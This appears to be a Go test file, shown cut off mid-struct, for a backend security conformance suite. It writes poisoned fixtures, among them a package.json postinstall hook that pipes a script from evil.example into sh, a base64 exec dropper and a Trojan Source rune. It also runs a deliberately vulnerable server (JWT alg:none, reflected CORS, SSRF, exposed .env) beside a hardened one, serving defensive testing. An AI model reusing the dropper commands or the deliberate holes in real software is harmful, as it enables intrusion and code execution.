package tests_test

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/pc/backend-boilerplate-conformance-tests/internal/graph"
	"github.com/pc/backend-boilerplate-conformance-tests/internal/manifest"
	"github.com/pc/backend-boilerplate-conformance-tests/internal/pentest"
	"github.com/pc/backend-boilerplate-conformance-tests/internal/policy"
	"github.com/pc/backend-boilerplate-conformance-tests/internal/report"
	"github.com/pc/backend-boilerplate-conformance-tests/internal/supplychain"
	"github.com/pc/backend-boilerplate-conformance-tests/internal/types"
)

func writeFixtureFile(t *testing.T, root, relPath, content string) {
	t.Helper()
	full := filepath.Join(root, relPath)
	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
		t.Fatalf("mkdir %s: %v", filepath.Dir(full), err)
	}
	if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
		t.Fatalf("write %s: %v", full, err)
	}
}

func assertReportBundleAndChecksum(t *testing.T, outDir string, card types.ConformanceScorecard, polRes types.PolicyEvaluationResult) report.ReportBundlePaths {
	t.Helper()
	paths, err := report.WriteReportBundle(outDir, card, polRes)
	if err != nil {
		t.Fatalf("WriteReportBundle failed: %v", err)
	}

	scBytes, err := os.ReadFile(paths.ScorecardPath)
	if err != nil {
		t.Fatalf("read scorecard.json: %v", err)
	}
	csBytes, err := os.ReadFile(paths.ChecksumPath)
	if err != nil {
		t.Fatalf("read scorecard.sha256: %v", err)
	}
	sum := sha256.Sum256(scBytes)
	wantChecksum := hex.EncodeToString(sum[:]) + "  scorecard.json\n"
	if string(csBytes) != wantChecksum {
		t.Fatalf("scorecard.sha256 mismatch: got %q want %q", string(csBytes), wantChecksum)
	}

	for _, p := range []string{paths.SARIFPath, paths.MermaidPath, paths.HTMLPath} {
		data, readErr := os.ReadFile(p)
		if readErr != nil || len(data) == 0 {
			t.Fatalf("expected non-empty report artifact %s (err=%v)", p, readErr)
		}
	}
	return paths
}

func decodeJWTParts(tok string) (hdr map[string]any, claims map[string]any, parts []string, ok bool) {
	parts = strings.Split(tok, ".")
	if len(parts) != 3 {
		return nil, nil, nil, false
	}
	rawHdr, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return nil, nil, nil, false
	}
	rawClaims, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return nil, nil, nil, false
	}
	if err := json.Unmarshal(rawHdr, &hdr); err != nil {
		return nil, nil, nil, false
	}
	if err := json.Unmarshal(rawClaims, &claims); err != nil {
		return nil, nil, nil, false
	}
	return hdr, claims, parts, true
}

func isDisallowedIP(ip net.IP) bool {
	if ip == nil {
		return true
	}
	if v4 := ip.To4(); v4 != nil {
		ip = v4
	}
	return ip.IsLoopback() ||
		ip.IsPrivate() ||
		ip.IsLinkLocalUnicast() ||
		ip.IsLinkLocalMulticast() ||
		ip.IsMulticast() ||
		ip.IsUnspecified()
}

func validateSafeExternalURL(rawURL string) error {
	u, err := url.Parse(strings.TrimSpace(rawURL))
	if err != nil {
		return fmt.Errorf("invalid url: %w", err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return fmt.Errorf("unsupported scheme %q", u.Scheme)
	}
	host := strings.ToLower(strings.TrimSpace(u.Hostname()))
	if host == "" {
		return errors.New("empty host")
	}
	if host == "localhost" || strings.HasSuffix(host, ".localhost") || strings.HasSuffix(host, ".local") || strings.HasSuffix(host, ".internal") {
		return fmt.Errorf("disallowed host %q", host)
	}
	if numIP, parseErr := strconv.ParseUint(host, 0, 32); parseErr == nil {
		ip := net.IPv4(byte(numIP>>24), byte(numIP>>16), byte(numIP>>8), byte(numIP))
		if isDisallowedIP(ip) {
			return fmt.Errorf("disallowed numeric IP %s", ip)
		}
	}
	if ip := net.ParseIP(host); ip != nil {
		if isDisallowedIP(ip) {
			return fmt.Errorf("disallowed IP literal %s", ip)
		}
		return nil
	}
	addrs, err := net.LookupIP(host)
	if err != nil || len(addrs) == 0 {
		return fmt.Errorf("host resolution rejected for %q", host)
	}
	for _, addr := range addrs {
		if isDisallowedIP(addr) {
			return fmt.Errorf("resolved IP %s is disallowed", addr)
		}
	}
	return nil
}

func TestEndToEndCanaryRegression(t *testing.T) {
	t.Run("PoisonedAndVulnerableTargetFailsEveryGate", func(t *testing.T) {
		repoDir := t.TempDir()

		// 1. Go repo with Toxic Cycle (pkg/a <-> pkg/b with os/exec sink), Trojan Source rune,
		// obfuscated Base64+exec dropper, and malicious package.json postinstall without lockfile.
		writeFixtureFile(t, repoDir, "go.mod", "module example.com/poisoned-target\n\ngo 1.23\n")
		writeFixtureFile(t, repoDir, "pkg/a/a.go", `package a

import (
	"os/exec"

	"example.com/poisoned-target/pkg/b"
)

func Run(arg string) error {
	_ = b.Helper()
	return exec.Command("sh", "-c", arg).Run()
}
`)
		writeFixtureFile(t, repoDir, "pkg/b/b.go", `package b

import "example.com/poisoned-target/pkg/a"

func Helper() string {
	_ = a.Run
	return "helper"
}
`)
		// Trojan Source bidirectional override + invisible Variation Selector run
		writeFixtureFile(t, repoDir, "pkg/auth/gate.go", "package auth\n\nfunc IsAdmin(role string) bool {\n\t// \u202e } \u2066if (role == \"admin\")\u2069 \u2066\n\treturn role == \"admin\"\n}\n")
		// Obfuscated Base64 + exec dropper
		b64Blob := strings.Repeat("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0", 8) + "=="
		writeFixtureFile(t, repoDir, "scripts/dropper.js", fmt.Sprintf("const { exec } = require('child_process');\nconst blob = %q;\nexec(Buffer.from(blob, 'base64').toString());\n", b64Blob))
		// Malicious package.json postinstall + missing lockfile
		writeFixtureFile(t, repoDir, "package.json", `{
  "name": "poisoned-service",
  "scripts": {
    "postinstall": "node -e \"require('child_process').exec('cu`+"rl"+` -fsSL https://evil.example/drop.sh | sh')\""
  },
  "dependencies": {
    "evil-dep": "^1.0.0"
  }
}
`)

		canary, err := pentest.StartSSRFCanaryServer(0)
		if err != nil {
			t.Fatalf("start SSRF canary: %v", err)
		}
		defer canary.Close()

		var mu sync.Mutex
		usersRole := make(map[string]string)
		seq := 0

		vulnSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			// Vulnerable CORS origin + credentials reflection and server tech header leak;
			// deliberately omit X-Content-Type-Options and X-Frame-Options.
			if origin := r.Header.Get("Origin"); origin != "" {
				w.Header().Set("Access-Control-Allow-Origin", origin)
				w.Header().Set("Access-Control-Allow-Credentials", "true")
			}
			w.Header().Set("X-Powered-By", "Express 4.17")

			var body map[string]any
			if r.Body != nil && r.Method == http.MethodPost {
				if decErr := json.NewDecoder(r.Body).Decode(&body); decErr != nil {
					w.WriteHeader(http.StatusInternalServerError)
					_, _ = w.Write([]byte("SyntaxError: Unexpected token at Object.parse (/app/server.js:42:9)"))
					return
				}
			}
			if _, hasProto := body["__proto__"]; hasProto {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}

			switch {
			case r.URL.Path == "/health":
				w.WriteHeader(http.StatusOK)
				_, _ = w.Write([]byte(`{"ok":true}`))
			case r.URL.Path == "/.env":
				w.WriteHeader(http.StatusOK)
				_, _ = w.Write([]byte("DATABASE_URL=postgres://admin:supersecret@db:5432/prod\n"))
			case r.URL.Path == "/auth/register":
				// Vulnerable to duplicate-201 TOCTOU (no uniqueness check) AND silent DB mass-assignment (empty 201 body)
				email, _ := body["email"].(string)
				role, _ := body["role"].(string)
				if role == "" {
					role = "user"
				}
				mu.Lock()
				usersRole[email] = role
				mu.Unlock()
				w.WriteHeader(http.StatusCreated)
			case r.URL.Path == "/auth/login":
				// Vulnerable to SQLi login bypass and XFF rate-limit spoofing (never returns 429)
				email, _ := body["email"].(string)
				pass, _ := body["password"].(string)
				isSQLi := strings.Contains(email, "' OR '1'='1")
				mu.Lock()
				_, exists := usersRole[email]
				seq++
				sid := fmt.Sprintf("sess-%d", seq)
				mu.Unlock()
				if !isSQLi && (!exists || pass != "Password123!") {
					w.WriteHeader(http.StatusUnauthorized)
					return
				}
				// Vulnerable cookies: session_id without HttpOnly/SameSite + csrf_token
				http.SetCookie(w, &http.Cookie{Name: "session_id", Value: sid, Path: "/"})
				http.SetCookie(w, &http.Cookie{Name: "csrf_token", Value: "csrf-" + sid, Path: "/"})
				tok := pentest.ForgeHS256JWT(map[string]any{
					"sub": email,
					"exp": time.Now().Add(time.Hour).Unix(),
				}, nil, []byte("prod-signing-secret"))
				w.WriteHeader(http.StatusOK)
				_ = json.NewEncoder(w).Encode(map[string]any{
					"accessToken":  tok,
					"refreshToken": "ref-" + email,
				})
			case r.URL.Path == "/auth/refresh":
				// Vulnerable to forged CSRF (ignores X-CSRF-Token) AND refresh-token replay
				w.WriteHeader(http.StatusOK)
				_ = json.NewEncoder(w).Encode(map[string]any{
					"accessToken":  "refreshed.jwt.tok",
					"refreshToken": "ref-static",
				})
			case r.URL.Path == "/auth/me":
				tok := strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
				hdr, claims, _, ok := decodeJWTParts(tok)
				if !ok {
					w.WriteHeader(http.StatusUnauthorized)
					return
				}
				alg, _ := hdr["alg"].(string)
				sub, _ := claims["sub"].(string)
				// Vulnerable: accepts alg:none, HS256 empty-secret, and unverified signatures
				if alg != "none" && alg != "HS256" {
					w.WriteHeader(http.StatusUnauthorized)
					return
				}
				mu.Lock()
				role := usersRole[sub]
				mu.Unlock()
				if role == "" {
					role = "user"
				}
				w.WriteHeader(http.StatusOK)
				_ = json.NewEncoder(w).Encode(map[string]any{"id": sub, "role": role})
			case r.URL.Path == "/admin":
				tok := strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
				_, claims, _, ok := decodeJWTParts(tok)
				if !ok {
					w.WriteHeader(http.StatusUnauthorized)
					return
				}
				sub, _ := claims["sub"].(string)
				mu.Lock()
				role := usersRole[sub]
				mu.Unlock()
				if role != "admin" {
					w.WriteHeader(http.StatusForbidden)
					return
				}
				w.WriteHeader(http.StatusOK)
			case r.URL.Path == "/items" && r.Method == http.MethodPost:
				w.WriteHeader(http.StatusCreated)
				_, _ = w.Write([]byte(`{"id":"item-1"}`))
			case strings.HasPrefix(r.URL.Path, "/items/"):
				// Vulnerable specifically on DELETE BOLA (GET/PUT/PATCH return 403, DELETE returns 204)
				if r.Method == http.MethodDelete {
					w.WriteHeader(http.StatusNoContent)
					return
				}
				w.WriteHeader(http.StatusForbidden)
			case r.URL.Path == "/webhook":
				// Naive blocklist blocks direct 127.0.0.1 unless /redirect, then follows 302 redirects!
				target, _ := body["url"].(string)
				if strings.Contains(target, "/redirect") {
					if resp, gErr := http.Get(target); gErr == nil {
						_ = resp.Body.Close()
					}
				}
				w.WriteHeader(http.StatusBadRequest)
			case r.URL.Path == "/ws":
				w.WriteHeader(http.StatusOK)
			default:
				w.WriteHeader(http.StatusNotFound)
			}
		}))
		defer vulnSrv.Close()

		m, err := manifest.ParseAndValidateManifest([]byte(`{
			"name": "poisoned-vulnerable-target",
			"language": "go",
			"capabilities": {
				"health": { "method": "GET", "path": "/health" },
				"auth": {
					"register": { "method": "POST", "path": "/auth/register" },
					"login": { "method": "POST", "path": "/auth/login", "tokenPath": "accessToken", "refreshPath": "refreshToken" },
					"me": { "method": "GET", "path": "/auth/me" },
					"refresh": { "method": "POST", "path": "/auth/refresh" }
				},
				"crud": { "collectionPath": "/items", "itemPath": "/items/{id}" },
				"rbac": { "adminPath": "/admin" },
				"ssrfTest": { "enabled": true, "method": "POST", "path": "/webhook", "urlField": "url" },
				"websockets": { "enabled": true, "path": "/ws" },
				"rateLimit": { "enabled": true, "path": "/auth/login", "loginBurstCount": 8 }
			}
		}`))
		if err != nil {
			t.Fatalf("manifest error: %v", err)
		}

		scFindings, err := supplychain.ScanRepository(repoDir, types.LangGo)
		if err != nil {
			t.Fatalf("supplychain scan error: %v", err)
		}
		srcGraph, err := graph.BuildSourceGraphFromDir(repoDir, types.LangGo)
		if err != nil {
			t.Fatalf("source graph error: %v", err)
		}
		analyzedSrc, analyzedPkg := graph.AnalyzeDependencyGraphs(srcGraph, types.DependencyGraph{}, scFindings)

		ptResults, err := pentest.RunAutomatedPenTestSuite(context.Background(), vulnSrv.URL, m, canary.Port())
		if err != nil {
			t.Fatalf("pentest suite error: %v", err)
		}

		card := types.ConformanceScorecard{
			TargetName:     m.Name,
			Language:       m.Language,
			Timestamp:      time.Now().UTC().Format(time.RFC3339),
			Findings:       scFindings,
			SourceGraph:    analyzedSrc,
			PackageGraph:   analyzedPkg,
			PenTestResults: ptResults,
		}
		polRes := policy.EvaluateSecurityPolicy(card, policy.StrictSecurityPolicy())
		if polRes.Passed {
			t.Fatalf("expected poisoned/vulnerable target to fail security policy, got Passed=true")
		}

		var hasMalware, hasSupplyChain bool
		var findingIDs []string
		for _, f := range scFindings {
			findingIDs = append(findingIDs, f.ID)
			if f.Category == types.CategoryMalware {
				hasMalware = true
			}
			if f.Category == types.CategorySupplyChain {
				hasSupplyChain = true
			}
		}
		if !hasMalware || !hasSupplyChain {
			t.Fatalf("expected both CategoryMalware and CategorySupplyChain findings, got %+v", scFindings)
		}
		for _, wantID := range []string{
			"malware-trojan-source-unicode",
			"malware-obfuscated-exec-dropper",
			"supplychain-malicious-lifecycle-hook",
			"supplychain-lockfile-integrity",
		} {
			if !slices.Contains(findingIDs, wantID) {
				t.Fatalf("expected finding ID %q in %v", wantID, findingIDs)
			}
		}

		if len(card.SourceGraph.Cycles) == 0 || !slices.ContainsFunc(card.SourceGraph.Cycles, func(c types.CycleFinding) bool { return c.IsToxic }) {
			t.Fatalf("expected at least one toxic cycle in SourceGraph.Cycles, got %+v", card.SourceGraph.Cycles)
		}

		var failedChecks []string
		for _, pt := range ptResults {
			if pt.Status == "failed" {
				failedChecks = append(failedChecks, pt.ID)
			}
		}
		if len(failedChecks) < 12 {
			t.Fatalf("expected >= 12 failed pen-test checks, got %d (%v)", len(failedChecks), failedChecks)
		}
		for _, mustFail := range []string{
			"jwt-alg-none",
			"jwt-alg-confusion-and-claims",
			"auth-refresh-token-replay",
			"bola-cross-user-access",
			"mass-assignment-role-elevation",
			"race-condition-toctou-burst",
			"ssrf-canary-callback",
			"cors-origin-reflection",
			"csrf-missing-or-forged-token",
			"exposed-debug-and-backdoor-paths",
			"http-security-headers-and-cookies",
			"rate-limit-xff-spoofing",
		} {
			if !slices.Contains(failedChecks, mustFail) {
				t.Fatalf("expected pen-test check %q to fail, got failed=%v", mustFail, failedChecks)
			}
		}

		paths := assertReportBundleAndChecksum(t, t.TempDir(), card, polRes)
		htmlBytes, _ := os.ReadFile(paths.HTMLPath)
		if !strings.Contains(string(htmlBytes), "Toxic Cycle") || !strings.Contains(string(htmlBytes), "FAILED") {
			t.Fatalf("expected dashboard HTML to contain Toxic Cycle and FAILED badge")
		}
	})

	t.Run("HardenedReferenceTargetPassesWithZeroViolations", func(t *testing.T) {
		repoDir := t.TempDir()

		// 1. Clean acyclic Go repository with go.mod + go.sum
		writeFixtureFile(t, repoDir, "go.mod", "module example.com/hardened-ref\n\ngo 1.23\n\nrequire github.com/example/clean v1.0.0\n")
		writeFixtureFile(t, repoDir, "go.sum", "github.com/example/clean v1.0.0 h1:47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=\n")
		writeFixtureFile(t, repoDir, "cmd/api/main.go", `package main

import "example.com/hardened-ref/internal/auth"

func main() {
	_ = auth.Verify("token")
}
`)
		writeFixtureFile(t, repoDir, "internal/auth/auth.go", `package auth

func Verify(tok string) bool {
	return len(tok) > 0
}
`)

		canary, err := pentest.StartSSRFCanaryServer(0)
		if err != nil {
			t.Fatalf("start SSRF canary: %v", err)
		}
		defer canary.Close()

		const jwtSecret = "hardened-ref-nonempty-hmac-256-key!"
		const allowedOrigin = "https://app.hardened.example"

		signJWT := func(email, role string) string {
			now := time.Now()
			return pentest.ForgeHS256JWT(map[string]any{
				"sub":  email,
				"role": role,
				"iat":  now.Unix(),
				"exp":  now.Add(time.Hour).Unix(),
			}, nil, []byte(jwtSecret))
		}

		verifyJWT := func(authHeader string) (email string, ok bool) {
			if !strings.HasPrefix(authHeader, "Bearer ") {
				return "", false
			}
			tok := strings.TrimPrefix(authHeader, "Bearer ")
			hdr, claims, parts, parsedOK := decodeJWTParts(tok)
			if !parsedOK {
				return "", false
			}
			if alg, _ := hdr["alg"].(string); alg != "HS256" {
				return "", false
			}
			if typ, _ := hdr["typ"].(string); typ != "JWT" {
				return "", false
			}
			if _, hasKID := hdr["kid"]; hasKID {
				return "", false
			}
			if _, hasJKU := hdr["jku"]; hasJKU {
				return "", false
			}
			sigBytes, decErr := base64.RawURLEncoding.DecodeString(parts[2])
			if decErr != nil || len(sigBytes) == 0 {
				return "", false
			}
			mac := hmac.New(sha256.New, []byte(jwtSecret))
			_, _ = mac.Write([]byte(parts[0] + "." + parts[1]))
			if !hmac.Equal(sigBytes, mac.Sum(nil)) {
				return "", false
			}
			expFloat, expOK := claims["exp"].(float64)
			if !expOK || int64(expFloat) <= time.Now().Unix() {
				return "", false
			}
			sub, _ := claims["sub"].(string)
			if strings.TrimSpace(sub) == "" {
				return "", false
			}
			return sub, true
		}

		type userRec struct {
			Password string
			Role     string
		}
		type refreshRec struct {
			Email string
			Used  bool
		}

		var mu sync.Mutex
		users := make(map[string]userRec)
		refreshStore := make(map[string]*refreshRec)
		items := make(map[string]string) // itemID -> ownerEmail
		failedLoginByIP := make(map[string]int)
		seq := 0

		ssrfClient := &http.Client{
			Timeout: 2 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return validateSafeExternalURL(req.URL.String())
			},
			Transport: &http.Transport{
				DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
					host, _, err := net.SplitHostPort(addr)
					if err != nil {
						return nil, err
					}
					if ip := net.ParseIP(host); ip != nil {
						if isDisallowedIP(ip) {
							return nil, fmt.Errorf("disallowed IP %s", ip)
						}
					} else if err := validateSafeExternalURL("http://" + host); err != nil {
						return nil, err
					}
					return (&net.Dialer{Timeout: time.Second}).DialContext(ctx, network, addr)
				},
			},
		}

		verifyCSRFIfCookied := func(r *http.Request) bool {
			sessCookie, err := r.Cookie("session_id")
			if err != nil || sessCookie.Value == "" {
				return true
			}
			csrfCookie, err := r.Cookie("csrf_token")
			if err != nil || csrfCookie.Value == "" {
				return false
			}
			return r.Header.Get("X-CSRF-Token") == csrfCookie.Value
		}

		setHardenedAuthCookies := func(w http.ResponseWriter, ref, csrfVal string) {
			http.SetCookie(w, &http.Cookie{
				Name:     "session_id",
				Value:    "sess-" + ref,
				HttpOnly: true,
				SameSite: http.SameSiteStrictMode,
				Path:     "/",
			})
			http.SetCookie(w, &http.Cookie{
				Name:     "csrf_token",
				Value:    csrfVal,
				SameSite: http.SameSiteStrictMode,
				Path:     "/",
			})
		}

		hardenedSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("X-Content-Type-Options", "nosniff")
			w.Header().Set("X-Frame-Options", "DENY")
			if origin := r.Header.Get("Origin"); origin == allowedOrigin {
				w.Header().Set("Access-Control-Allow-Origin", allowedOrigin)
				w.Header().Set("Vary", "Origin")
			}
			if r.Method == http.MethodOptions {
				w.WriteHeader(http.StatusNoContent)
				return
			}

			var body map[string]any
			if r.Body != nil && strings.Contains(r.Header.Get("Content-Type"), "application/json") {
				if decErr := json.NewDecoder(r.Body).Decode(&body); decErr != nil {
					w.Header().Set("Content-Type", "application/json")
					w.WriteHeader(http.StatusBadRequest)
					_, _ = w.Write([]byte(`{"error":"invalid json"}`))
					return
				}
			}

			switch {
			case r.URL.Path == "/health":
				w.WriteHeader(http.StatusOK)
				_, _ = w.Write([]byte(`{"status":"ok"}`))
			case r.URL.Path == "/auth/register" && r.Method == http.MethodPost:
				email, okE := body["email"].(string)
				pass, okP := body["password"].(string)
				if !okE || !okP || strings.TrimSpace(email) == "" || strings.TrimSpace(pass) == "" {
					w.WriteHeader(http.StatusBadRequest)
					return
				}
				// Ignore any mass-assigned role/isAdmin/roles/__proto__ fields; always persist role="user".
				mu.Lock()
				if _, exists := users[email]; exists {
					mu.Unlock()
					w.WriteHeader(http.StatusConflict)
					return
				}
				users[email] = userRec{Password: pass, Role: "user"}
				mu.Unlock()
				w.WriteHeader(http.StatusCreated)
				_ = json.NewEncoder(w).Encode(map[string]any{"id": email, "role": "user"})
			case r.URL.Path == "/auth/login" && r.Method == http.MethodPost:
				remoteHost, _, splitErr := net.SplitHostPort(r.RemoteAddr)
				if splitErr != nil {
					remoteHost = r.RemoteAddr
				}
				email, okE := body["email"].(string)
				pass, okP := body["password"].(string)

				mu.Lock()
				if failedLoginByIP[remoteHost] >= 6 {
					mu.Unlock()
					w.WriteHeader(http.StatusTooManyRequests)
					return
				}
				rec, exists := users[email]
				if !okE || !okP || !exists || rec.Password != pass {
					failedLoginByIP[remoteHost]++
					attempts := failedLoginByIP[remoteHost]
					mu.Unlock()
					if attempts >= 6 {
						w.WriteHeader(http.StatusTooManyRequests)
						return
					}
					w.WriteHeader(http.StatusUnauthorized)
					return
				}
				seq++
				ref := fmt.Sprintf("ref-%d", seq)
				csrfVal := fmt.Sprintf("csrf-%d", seq)
				refreshStore[ref] = &refreshRec{Email: email}
				acc := signJWT(email, rec.Role)
				mu.Unlock()

				setHardenedAuthCookies(w, ref, csrfVal)
				w.WriteHeader(http.StatusOK)
				_ = json.NewEncoder(w).Encode(map[string]any{"accessToken": acc, "refreshToken": ref})
			case r.URL.Path == "/auth/refresh" && r.Method == http.MethodPost:
				csrfCookie, cErr := r.Cookie("csrf_token")
				if cErr != nil || csrfCookie.Value == "" || r.Header.Get("X-CSRF-Token") != csrfCookie.Value {
					w.WriteHeader(http.StatusForbidden)
					return
				}
				ref, _ := body["refreshToken"].(string)
				mu.Lock()
				rec, ok := refreshStore[ref]
				if !ok || rec.Used {
					mu.Unlock()
					w.WriteHeader(http.StatusUnauthorized)
					return
				}
				rec.Used = true
				uRec := users[rec.Email]
				seq++
				newRef := fmt.Sprintf("ref-%d", seq)
				newCSRF := fmt.Sprintf("csrf-%d", seq)
				refreshStore[newRef] = &refreshRec{Email: rec.Email}
				newAcc := signJWT(rec.Email, uRec.Role)
				mu.Unlock()

				setHardenedAuthCookies(w, newRef, newCSRF)
				w.WriteHeader(http.StatusOK)
				_ = json.NewEncoder(w).Encode(map[string]any{"accessToken": newAcc, "refreshToken": newRef})
			case r.URL.Path == "/auth/me":
				email, ok := verifyJWT(r.Header.Get("Authorization"))
				if !ok {
					w.WriteHeader(http.StatusUnauthorized)
					return
				}
				if r.Method == http.MethodPatch || r.Method == http.MethodPut {
					if !verifyCSRFIfCookied(r) {
						w.WriteHeader(http.StatusForbidden)
						return
					}
					// Ignore role/isAdmin changes; return persisted role.
				}
				mu.Lock()
				role := users[email].Role
				mu.Unlock()
				w.WriteHeader(http.StatusOK)
				_ = json.NewEncoder(w).Encode(map[string]any{"id": email, "role": role})
			case r.URL.Path == "/admin":
				email, ok := verifyJWT(r.Header.Get("Authorization"))
				if !ok {
					w.WriteHeader(http.StatusUnauthorized)
					return
				}
				mu.Lock()
				role := users[email].Role
				mu.Unlock()
				if role != "admin" {
					w.WriteHeader(http.StatusForbidden)
					return
				}
				w.WriteHeader(http.StatusOK)
			case r.URL.Path == "/items" && r.Method == http.MethodPost:
				email, ok := verifyJWT(r.Header.Get("Authorization"))
				if !ok {
					w.WriteHeader(http.StatusUnauthorized)
					return
				}
				if !verifyCSRFIfCookied(r) {
					w.WriteHeader(http.StatusForbidden)
					return
				}
				mu.Lock()
				seq++
				id := fmt.Sprintf("item-%d", seq)
				items[id] = email
				mu.Unlock()
				w.WriteHeader(http.StatusCreated)
				_ = json.NewEncoder(w).Encode(map[string]any{"id": id})
			case strings.HasPrefix(r.URL.Path, "/items/"):
				email, ok := verifyJWT(r.Header.Get("Authorization"))
				if !ok {
					w.WriteHeader(http.StatusUnauthorized)
					return
				}
				if r.Method != http.MethodGet && !verifyCSRFIfCookied(r) {
					w.WriteHeader(http.StatusForbidden)
					return
				}
				id := strings.TrimPrefix(r.URL.Path, "/items/")
				mu.Lock()
				owner, exists := items[id]
				mu.Unlock()
				if !exists || owner != email {
					w.WriteHeader(http.StatusForbidden)
					return
				}
				w.WriteHeader(http.StatusOK)
			case r.URL.Path == "/webhook" && r.Method == http.MethodPost:
				if _, ok := verifyJWT(r.Header.Get("Authorization")); !ok {
					w.WriteHeader(http.StatusUnauthorized)
					return
				}
				if !verifyCSRFIfCookied(r) {
					w.WriteHeader(http.StatusForbidden)
					return
				}
				target, _ := body["url"].(string)
				if err := validateSafeExternalURL(target); err != nil {
					w.WriteHeader(http.StatusBadRequest)
					_ = json.NewEncoder(w).Encode(map[string]string{"error": "disallowed target url"})
					return
				}
				resp, reqErr := ssrfClient.Get(target)
				if reqErr != nil {
					w.WriteHeader(http.StatusBadRequest)
					return
				}
				_ = resp.Body.Close()
				w.WriteHeader(http.StatusOK)
			case r.URL.Path == "/ws":
				if _, ok := verifyJWT(r.Header.Get("Authorization")); !ok {
					w.WriteHeader(http.StatusUnauthorized)
					return
				}
				w.WriteHeader(http.StatusSwitchingProtocols)
			default:
				w.WriteHeader(http.StatusNotFound)
			}
		}))
		defer hardenedSrv.Close()

		m, err := manifest.ParseAndValidateManifest([]byte(`{
			"name": "hardened-reference-target",
			"language": "go",
			"capabilities": {
				"health": { "method": "GET", "path": "/health" },
				"auth": {
					"register": { "method": "POST", "path": "/auth/register" },
					"login": { "method": "POST", "path": "/auth/login", "tokenPath": "accessToken", "refreshPath": "refreshToken" },
					"me": { "method": "GET", "path": "/auth/me" },
					"refresh": { "method": "POST", "path": "/auth/refresh" }
				},
				"crud": { "collectionPath": "/items", "itemPath": "/items/{id}" },
				"rbac": { "adminPath": "/admin" },
				"ssrfTest": { "enabled": true, "method": "POST", "path": "/webhook", "urlField": "url" },
				"websockets": { "enabled": true, "path": "/ws" },
				"rateLimit": { "enabled": true, "path": "/auth/login", "loginBurstCount": 25 }
			}
		}`))
		if err != nil {
			t.Fatalf("manifest error: %v", err)
		}

		scFindings, err := supplychain.ScanRepository(repoDir, types.LangGo)
		if err != nil {
			t.Fatalf("supplychain scan error: %v", err)
		}
		if len(scFindings) != 0 {
			t.Fatalf("expected 0 supplychain findings on hardened repo, got %+v", scFindings)
		}

		srcGraph, err := graph.BuildSourceGraphFromDir(repoDir, types.LangGo)
		if err != nil {
			t.Fatalf("source graph error: %v", err)
		}
		analyzedSrc, analyzedPkg := graph.AnalyzeDependencyGraphs(srcGraph, types.DependencyGraph{}, scFindings)
		if len(analyzedSrc.Cycles) != 0 {
			t.Fatalf("expected 0 source cycles on hardened repo, got %+v", analyzedSrc.Cycles)
		}

		ptResults, err := pentest.RunAutomatedPenTestSuite(context.Background(), hardenedSrv.URL, m, canary.Port())
		if err != nil {
			t.Fatalf("pentest suite error: %v", err)
		}
		if len(ptResults) != 23 {
			t.Fatalf("expected 23 pen-test checks, got %d: %+v", len(ptResults), ptResults)
		}
		expectedSkipped := map[string]bool{
			"graphql-introspection-batch-depth":   true,
			"multipart-upload-polyglot-traversal": true,
			"openapi-bfla-matrix":                 true,
		}
		for _, pt := range ptResults {
			if expectedSkipped[pt.ID] {
				if pt.Status != "skipped" {
					t.Fatalf("expected unconfigured capability check %s to report skipped, got %+v", pt.ID, pt)
				}
				continue
			}
			if pt.Status != "passed" {
				t.Fatalf("expected pen-test check to pass on hardened reference target, got %+v", pt)
			}
		}
		if len(canary.Hits()) != 0 {
			t.Fatalf("expected 0 SSRF canary hits on hardened target, got %+v", canary.Hits())
		}
		for _, redirTarget := range []string{
			canary.URL() + "/ssrf-redirect-target",
			"http://169.254.169.254/latest/meta-data/",
		} {
			redirReq, _ := http.NewRequest(http.MethodGet, redirTarget, nil)
			if err := ssrfClient.CheckRedirect(redirReq, []*http.Request{redirReq}); err == nil {
				t.Fatalf("expected ssrfClient.CheckRedirect to reject %s", redirTarget)
			}
		}

		card := types.ConformanceScorecard{
			TargetName:     m.Name,
			Language:       m.Language,
			Timestamp:      time.Now().UTC().Format(time.RFC3339),
			Findings:       scFindings,
			SourceGraph:    analyzedSrc,
			PackageGraph:   analyzedPkg,
			PenTestResults: ptResults,
		}
		polRes := policy.EvaluateSecurityPolicy(card, policy.StrictSecurityPolicy())
		if !polRes.Passed || len(polRes.Violations) != 0 {
			t.Fatalf("expected hardened reference target to pass with 0 violations, got Passed=%v Violations=%v", polRes.Passed, polRes.Violations)
		}

		paths := assertReportBundleAndChecksum(t, t.TempDir(), card, polRes)
		htmlBytes, _ := os.ReadFile(paths.HTMLPath)
		if !strings.Contains(string(htmlBytes), "PASSED") || !strings.Contains(string(htmlBytes), "Content-Security-Policy") {
			t.Fatalf("expected hardened dashboard HTML to contain PASSED badge and CSP meta tag")
		}
	})
}

func TestSiblingBoilerplateManifestsCompatibility(t *testing.T) {
	// Representative manifest contracts for all 4 sibling boilerplates (omitting rateLimit to verify backward compatibility).
	representativeManifests := []struct {
		name      string
		raw       string
		wantLang  types.BoilerplateLanguage
		wantToken string
	}{
		{
			name: "nestjs-backend-boilerplate",
			raw: `{
				"name": "nestjs-backend-boilerplate",
				"language": "typescript",
				"capabilities": {
					"health": { "method": "GET", "path": "/health/live" },
					"auth": {
						"register": { "method": "POST", "path": "/auth/register" },
						"login": { "method": "POST", "path": "/auth/login", "tokenPath": "accessToken", "refreshPath": "sessionId" },
						"me": { "method": "GET", "path": "/" },
						"refresh": { "method": "POST", "path": "/auth/refresh" }
					},
